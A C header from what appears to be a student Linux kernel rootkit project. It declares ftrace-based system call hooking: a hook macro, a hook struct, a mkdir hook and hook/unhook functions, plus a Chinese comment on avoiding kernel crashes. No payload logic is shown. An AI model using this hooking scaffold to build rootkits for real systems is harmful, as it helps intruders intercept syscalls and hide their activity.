//
// Created by black on 22-10-13.
//

#ifndef UCAS_ROOTKIT_HOOK_H
#define UCAS_ROOTKIT_HOOK_H

#include <linux/ftrace.h>

#if defined(CONFIG_X86_64)
#define SYSCALL_NAME(name) ("__x64_sys_" name)
#else
#define SYSCALL_NAME(name) ("sys_" name)
#endif

#define COMMENT(ignored)

#define HOOK(_func, _hook_func_name) \
{                                    \
    .function=_func,                 \
    .hook_func_name=_hook_func_name, \
    .ops={ \
        .func=FtraceHandle, \
        .flags=FTRACE_OPS_FL_SAVE_REGS | \
               FTRACE_OPS_FL_RECURSION_SAFE \
       COMMENT(不添加这行会导致内核崩溃，好像是多核会修改堆栈数据)\
        } \
}

struct ftrace_hook {
    long (*function)(struct pt_regs *regs);

    unsigned char *hook_func_name;
    struct ftrace_ops ops;
};

long HookMkdir(struct pt_regs *regs);

void FtraceHandle(unsigned long ip, unsigned long parent_ip,
                  struct ftrace_ops *op, struct pt_regs *regs);

void FtraceHook(struct ftrace_ops *ops, unsigned char *orig_function_name);

void FtraceUnHook(struct ftrace_ops *ops);

#endif //UCAS_ROOTKIT_HOOK_H
